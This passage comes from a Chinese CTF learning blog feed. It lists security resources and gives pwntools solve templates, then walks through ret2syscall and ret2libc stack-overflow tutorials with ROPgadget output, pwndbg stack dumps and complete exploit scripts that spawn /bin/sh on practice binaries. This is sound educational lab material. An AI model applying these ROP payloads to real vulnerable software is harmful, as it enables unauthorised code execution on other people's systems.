href=\"https://blog.csdn.net/Eastmount\">https://blog.csdn.net/Eastmount</a></li>\n<li><a href=\"http://shell-storm.org/\">http://shell-storm.org</a> 国外大佬，还有很多shellcode样本[<a href=\"http://shell-storm.org/shellcode/]\">http://shell-storm.org/shellcode/]</a>(</li>\n</ul>\n<p><a href=\"http://scz.617.cn:8/\">http://scz.617.cn:8</a>   不知道是哪个大佬.. </p>\n<p><a href=\"http://showlinkroom.me/\">http://showlinkroom.me</a></p>\n<p><a href=\"https://eternalsakura13.com/\">https://eternalsakura13.com/</a></p>\n<p><a href=\"https://kiprey.github.io/\">https://kiprey.github.io/</a></p>\n<p><a href=\"http://blog.eonew.cn/\">http://blog.eonew.cn/</a></p>\n<p><a href=\"http://ruanyifeng.com/blog/2018/02/docker-tutorial.html\">http://ruanyifeng.com/blog/2018/02/docker-tutorial.html</a></p>\n<p><a href=\"https://thiscute.world/\">https://thiscute.world/</a> 最近发现的两个计算机的大佬,在v2ex中发现的</p>\n<p><a href=\"https://soulteary.com/\">https://soulteary.com</a> </p>\n<p>0xffff社区</p>\n<p><a href=\"https://0xffff.one/d/1085-mit6-s081-operating-system\">https://0xffff.one/d/1085-mit6-s081-operating-system</a></p>\n<h2 id=\"CTF知名战队网站\"><a href=\"#CTF知名战队网站\" class=\"headerlink\" title=\"CTF知名战队网站\"></a>CTF知名战队网站</h2><p>国科大-NeSE:<a href=\"https://nese.team/\">https://nese.team</a></p>\n<p>清华:<a href=\"https://redbud.info/\">https://redbud.info</a></p>\n<p>复旦白泽战队:知乎、微信公众号</p>\n<p>X1cT34m: <a href=\"https://ctf.njupt.edu.cn/\">https://ctf.njupt.edu.cn</a>   </p>\n<p>SU:<a href=\"https://team-su.github.io/\">https://team-su.github.io</a></p>\n<p>星盟:<a href=\"https://space.bilibili.com/489643272\">https://space.bilibili.com/489643272</a> 有ctf培训课程 pwn已完结 、 微信公众号:星盟安全</p>\n<p>天璇Merak: 微信公众号,有一些文章,更新较少</p>\n<p>星盟  <a href=\"http://blog.xmcve.com/\">http://blog.xmcve.com</a></p>\n<h2 id=\"漏洞挖掘-x2F-分析工具\"><a href=\"#漏洞挖掘-x2F-分析工具\" class=\"headerlink\" title=\"漏洞挖掘&#x2F;分析工具\"></a>漏洞挖掘&#x2F;分析工具</h2><p>angr</p>\n<h2 id=\"一些小工具\"><a href=\"#一些小工具\" class=\"headerlink\" title=\"一些小工具:\"></a>一些小工具:</h2><p>Compiler Explorer   在线应用层代码转汇编</p>\n<p>在线运行汇编 <a href=\"https://www.tutorialspoint.com/compile_assembly_online.php\">https://www.tutorialspoint.com/compile_assembly_online.php</a></p>\n<p><a href=\"https://www.textcompare.org/\">https://www.textcompare.org</a> diff网站,比较各种内容的不同</p>\n<p><a href=\"https://gchq.github.io/CyberChef/\">https://gchq.github.io/CyberChef/</a> 解密解码工具</p>\n<p><a href=\"https://cloudconvert.com/\">https://cloudconvert.com</a> 在线格式转换</p>\n<p><a href=\"https://web.archive.org/\">https://web.archive.org</a> 查看历史网站记录 </p>\n<p><a href=\"https://cloudconvert.com/\">https://cloudconvert.com</a>  各种文件的格式转换</p>\n<p><a href=\"https://www.ilovepdf.com/\">https://www.ilovepdf.com</a>  pdf操作，切割等</p>\n<h3 id=\"ctf导航\"><a href=\"#ctf导航\" class=\"headerlink\" title=\"ctf导航\"></a>ctf导航</h3><p><a href=\"http://www.ctfiot.com/\">http://www.ctfiot.com</a>. ChaMd5团队做的</p>\n<p><a href=\"https://ctf.mzy0.com/\">https://ctf.mzy0.com</a></p>\n<h2 id=\"特定漏洞相关资源\"><a href=\"#特定漏洞相关资源\" class=\"headerlink\" title=\"特定漏洞相关资源\"></a>特定漏洞相关资源</h2><h3 id=\"堆\"><a href=\"#堆\" class=\"headerlink\" title=\"堆\"></a>堆</h3><p>how2heap(github)</p>\n<p><a href=\"https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2\">https://bbs.kanxue.com/thread-272416.htm#msg_header_h1_2</a></p>\n<h2 id=\"待整理资源\"><a href=\"#待整理资源\" class=\"headerlink\" title=\"待整理资源\"></a>待整理资源</h2><p><a href=\"https://blog.csdn.net/Breeze_CAT/article/details/103788631\">https://blog.csdn.net/Breeze_CAT/article/details/103788631</a></p>\n<h1 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h1><p>查看系统调用</p>\n<p><a href=\"https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl\">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p>\n<p>系统调用参考\\查看系统调用参数</p>\n<p><a href=\"https://syscalls64.paolostivanin.com/\">https://syscalls64.paolostivanin.com</a></p>\n<p><a href=\"https://elixir.bootlin.com/linux/v5.19/C/ident/getname\">https://elixir.bootlin.com/linux/v5.19/C/ident/getname</a></p>\n<p>macbook 快捷键</p>\n<p><a href=\"http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac%E4%B8%8BIterm2%E4%BD%BF%E7%94%A8%E5%8F%8A%E5%BF%AB%E6%8D%B7%E9%94%AE.html\">http://dragon-li.gitee.io/my-wiki/doc/mac/005-Mac下Iterm2使用及快捷键.html</a></p>\n<p>解题模版</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span> //</span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2syscall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh,<span class=\"string\">&quot;break *0x8048e96&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = <span class=\"number\">0x080BE408</span></span><br><span class=\"line\">edxecxebx = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">eaxret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">int80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">108</span> + <span class=\"number\">4</span>) + p32(eaxret)  + p32(<span class=\"number\">0xb</span>) + p32(edxecxebx) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x080BE408</span>)+p32(int80)</span><br><span class=\"line\">  </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.arch=<span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./hacknote&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">length,context</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;size&quot;</span>,<span class=\"built_in\">str</span>(length))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Content&quot;</span>,context)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">Print</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;Index&quot;</span>,<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;aaa&quot;</span>)</span><br><span class=\"line\">add(<span class=\"number\">16</span>,<span class=\"string\">&quot;bbb&quot;</span>)</span><br><span class=\"line\">delete(<span class=\"number\">0</span>)</span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">add(<span class=\"number\">8</span>,p32(<span class=\"number\">0x08048986</span>))</span><br><span class=\"line\">Print(<span class=\"number\">0</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"><span class=\"comment\">#io.recv(1024)</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>libc版本问题,需要换一下</p>\n<p>2.27</p>\n<p>[DEBUG] Received 0x29 bytes:<br>    b’free(): double free detected in tcache 2\\n’</p>\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/",
            "title": "pwn入门-9-栈溢出ret2系列",
            "date_published": "2023-02-18T07:10:56.000Z",
            "content_html": "<p>这部分主要来源于ctf-wiki</p>\n<h1 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h1><p>​\t\t这个其实就是利用了系统调用(syscall), 什么是系统调用呢? 参看基础知识篇,这里没有system了,但是不影响getshell,因为system的底层是调用的execve系统调用,我们只需要找到gadget,来构造系统调用,调用execve,然后传入参数&#x2F;bin&#x2F;sh,即可. 即 execve(“&#x2F;bin&#x2F;sh”)</p>\n<p>​\t\t针对系统调用还有很多其他的利用方法,比如经典的ROW,就是说如果我们不能够执行execve getshell的话,我们可以想办法读取flag,毕竟我们的目的就是拿到flag,可以进行read open write将flag写入一个地方,然后打印出来即可.(后面再写相关的)</p>\n<p>​\t\t这里我们利用的是 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL),<font color=\"red\">系统调用的参数不是根据那个调用约定了.  不用栈传参了,都需要用到寄存器</font>eax ebx ecx edx 分别存放 系统调用号和第 1 2 3 个参数, 所以他们的值分别为 0xb &#x2F;bin&#x2F;sh 0 0 , .rodata:080BE408 aBinSh          db ‘&#x2F;bin&#x2F;sh’,0  这个地址里存放着&#x2F;bin&#x2F;sh</p>\n<p>buf 108 + 4 ebp + retaddress </p>\n<h2 id=\"寻找gadget\"><a href=\"#寻找gadget\" class=\"headerlink\" title=\"寻找gadget\"></a>寻找gadget</h2><p>​\t\t要找到int 0x80 gadget,以及那几个pop, 利用ROPgadget ,具体语句及结果如下</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary rop  --only <span class=\"string\">&#x27;pop|ret&#x27;</span> | grep <span class=\"string\">&#x27;eax&#x27;</span> </span><br><span class=\"line\">ROPgadget --binary ret2syscall  --only <span class=\"string\">&#x27;int&#x27;</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x0806eb90</span> : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class=\"line\"><span class=\"number\">0x080bb196</span> : pop eax ; ret  </span><br><span class=\"line\"><span class=\"number\">0x08049421</span> : <span class=\"type\">int</span> <span class=\"number\">0x80</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>所以payload构造如下<br>binsh &#x3D; 0x080BE408<br>edxecxebx &#x3D; 0x0806eb90<br>eaxret &#x3D; 0x080bb196<br>int80 &#x3D; 0x08049421<br>payload &#x3D; b”a”*(108 + 4) + p32(eaxret)  + p32(0xb) + p32(edxecxebx) + p32(0) + p32(0) + p32(0x080BE408) + p32(int80)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ret2syscall&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">gdb.attach(sh,<span class=\"string\">&quot;break *0x8048e96&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = <span class=\"number\">0x080BE408</span></span><br><span class=\"line\">edxecxebx = <span class=\"number\">0x0806eb90</span></span><br><span class=\"line\">eaxret = <span class=\"number\">0x080bb196</span></span><br><span class=\"line\">int80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*(<span class=\"number\">108</span> + <span class=\"number\">4</span>) + p32(eaxret)  + p32(<span class=\"number\">0xb</span>) + p32(edxecxebx) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x080BE408</span>)+p32(int80)</span><br><span class=\"line\">  </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>关于esp和ret的关系,ret后esp怎么移动等,需要再看看</p>\n<p>Pop 一次后, esp往高地址移动一个地址</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230218192128330.png\" alt=\"image-20230218192128330\" style=\"zoom: 33%;\">\n\n\n\n<p>为什么ret后就到了栈的下一个地址???</p>\n<p>ret的时候, esp就指向了返回地址那一行,执行完pop后,esp移动到下一个gadget,然后ret弹出这个gadget的地址,作为下一条指令,由此一步步跟进</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230218192552976.png\" alt=\"image-20230218192552976\"></p>\n<h1 id=\"ret2libc\"><a href=\"#ret2libc\" class=\"headerlink\" title=\"ret2libc\"></a>ret2libc</h1><p>​\t\t执行libc中的函数,一个关键点是找对libc版本.</p>\n<p>​\t\t通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)(它们的关系???????)</p>\n<h2 id=\"re2libc1\"><a href=\"#re2libc1\" class=\"headerlink\" title=\"re2libc1\"></a>re2libc1</h2><p>​\t\t反汇编代码</p>\n<p>​\t\t先从它自身寻找system和&#x2F;bin&#x2F;sh</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary ret2libc1 --<span class=\"built_in\">string</span> <span class=\"string\">&#x27;/bin/sh&#x27;</span>  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x08048720</span> : /bin/sh</span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># objdump -d ret2libc1 | grep <span class=\"string\">&quot;system&quot;</span></span></span><br><span class=\"line\"><span class=\"number\">08048460</span> &lt;system@plt&gt;:</span><br><span class=\"line\"><span class=\"number\">8048611</span>:\te8 <span class=\"number\">4</span>a fe ff ff       \tcall   <span class=\"number\">8048460</span> &lt;system@plt&gt;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t其活了,就覆盖返回地址为system,然后给它传参就好了,问题是怎么传参呢?栈的结构是怎样的?</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220094904834.png\" alt=\"image-20230220094904834\"></p>\n<p>​\t\t当走到返回地址这里时,进入call system,就相当于新调用了一个函数,</p>\n<p>​\t\t说实话这里还是不太懂流程,<font color=\"red\">不过最好的办法就是自己去调试! </font></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0xf7e4c623</span> &lt;gets+<span class=\"number\">291</span>&gt;    push   ecx                           &lt;_IO_2_1_stdin_&gt;</span><br><span class=\"line\">  <span class=\"number\">0xf7e4c624</span> &lt;gets+<span class=\"number\">292</span>&gt;    call   __uflow                    &lt;__uflow&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"number\">0xf7e4c629</span> &lt;gets+<span class=\"number\">297</span>&gt;    add    esp, <span class=\"number\">0x10</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t在返回到system时,栈的结构就是这样子的了,符合上图..但也没啥…还是看书把..参见下面一章节</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp <span class=\"number\">0xffffd4e0</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│     <span class=\"number\">0xffffd4e4</span> —▸ <span class=\"number\">0x8048720</span> ◂— das     <span class=\"comment\">/* &#x27;/bin/sh&#x27; */</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t找到了俩地址之外,还要找好偏移,找偏移有很多种方法</p>\n<p>​\t\t&#x2F;&#x2F; [sp+1Ch] [bp-64h]@1 这个可以吗?  </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">和pwn入门<span class=\"number\">-1</span>-初识里面的例子一样,eax作为字符串的开始地址,一直往上走到ebp,所以可以在gets这里下断点,输入一些a,然后查看栈的布局即可</span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"number\">0x8048677</span>  &lt;main+<span class=\"number\">95</span>&gt;                  lea    eax, [esp + <span class=\"number\">0x1c</span>]</span><br><span class=\"line\"><span class=\"number\">0x804867b</span>  &lt;main+<span class=\"number\">99</span>&gt;                  mov    dword ptr [esp], eax</span><br><span class=\"line\"><span class=\"number\">0x804867e</span>  &lt;main+<span class=\"number\">102</span>&gt;                 call   gets@plt                     &lt;gets@plt&gt;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">stack</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│ esp <span class=\"number\">0xffffd540</span> —▸ <span class=\"number\">0xffffd55c</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0004</span>│     <span class=\"number\">0xffffd544</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0008</span>│     <span class=\"number\">0xffffd548</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">03</span>:<span class=\"number\">000</span>c│     <span class=\"number\">0xffffd54c</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">04</span>:<span class=\"number\">0010</span>│     <span class=\"number\">0xffffd550</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">05</span>:<span class=\"number\">0014</span>│     <span class=\"number\">0xffffd554</span> ◂— <span class=\"number\">0x2c307d</span> <span class=\"comment\">/* &#x27;&#125;0,&#x27; */</span></span><br><span class=\"line\"><span class=\"number\">06</span>:<span class=\"number\">0018</span>│     <span class=\"number\">0xffffd558</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">07</span>:<span class=\"number\">001</span>c│ eax <span class=\"number\">0xffffd55c</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">08</span>:<span class=\"number\">0020</span>│  <span class=\"number\">0xffffd560</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">... ↓     <span class=\"number\">7</span> skipped</span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">10</span>:<span class=\"number\">0040</span>│  <span class=\"number\">0xffffd580</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">... ↓     <span class=\"number\">7</span> skipped</span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">18</span>:<span class=\"number\">0060</span>│  <span class=\"number\">0xffffd5a0</span> ◂— <span class=\"string\">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span></span><br><span class=\"line\">... ↓     <span class=\"number\">7</span> skipped</span><br><span class=\"line\">pwndbg&gt;</span><br><span class=\"line\"><span class=\"number\">20</span>:<span class=\"number\">0080</span>│     <span class=\"number\">0xffffd5c0</span> ◂— <span class=\"string\">&#x27;aaaaaaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">21</span>:<span class=\"number\">0084</span>│     <span class=\"number\">0xffffd5c4</span> ◂— <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\"><span class=\"number\">22</span>:<span class=\"number\">0088</span>│ ebp <span class=\"number\">0xffffd5c8</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">23</span>:<span class=\"number\">008</span>c│     <span class=\"number\">0xffffd5cc</span> —▸ <span class=\"number\">0xf7dfdfa1</span> (__libc_start_main+<span class=\"number\">241</span>) ◂— add    esp, <span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">24</span>:<span class=\"number\">0090</span>│     <span class=\"number\">0xffffd5d0</span> ◂— <span class=\"number\">0x1</span></span><br><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n\n<p>​\t\t上述例子中输入了108个a,所以缓冲区是108,然后ebp占4位,然后就是返回地址了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh  = process(<span class=\"string\">&quot;./ret2libc1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">binsh = <span class=\"number\">0x08048720</span></span><br><span class=\"line\">system = <span class=\"number\">0x08048460</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">112</span> + p32(system) + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">4</span> + p32(binsh) </span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t</p>\n<p>​\t</p>\n<h2 id=\"函数调用、序言与后记\"><a href=\"#函数调用、序言与后记\" class=\"headerlink\" title=\"函数调用、序言与后记\"></a>函数调用、序言与后记</h2><p>​\t《计算机安全导论深度实践》p99.</p>\n<h3 id=\"函数调用\"><a href=\"#函数调用\" class=\"headerlink\" title=\"函数调用\"></a>函数调用</h3><p>​\t\t为什么system后面是exit(就是返回地址),这是因为正常情况下,我们在call 一个函数的时候,也就是<font color=\"red\">一个函数被调用的时候,会把它的返回地址压入栈中</font>,等返回的时候取用,但是我们这里不是正常的call,而是直接覆盖掉了返回地址,所以就没有压栈的那个操作了,<font color=\"red\">所以需要我们手动把返回地址写入里面</font>. 此时push 返回地址进去后,esp就是下面序言的a状态</p>\n<h3 id=\"序言\"><a href=\"#序言\" class=\"headerlink\" title=\"序言\"></a>序言</h3><p>​\t\t序言就是函数开头处的代码,用于为函数准备栈和指针. IA-32(32位x86)体系结构中,序言内设指令为enter,具体是下面三条指令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pushl %ebp  //保存调用者的ebp值(用于被调用函数结束后,恢复之前调用函数的栈帧)</span><br><span class=\"line\">movl %esp, %ebp //把esp赋值给ebp,这样ebp就到了 被调用函数的栈帧了</span><br><span class=\"line\">subl %N, %esp  //给局部变量开辟一块空间</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-9-%E6%A0%88%E6%BA%A2%E5%87%BAret2%E7%B3%BB%E5%88%97/image-20230220103110353.png\" alt=\"image-20230220103110353\"></p>\n<h3 id=\"后记\"><a href=\"#后记\" class=\"headerlink\" 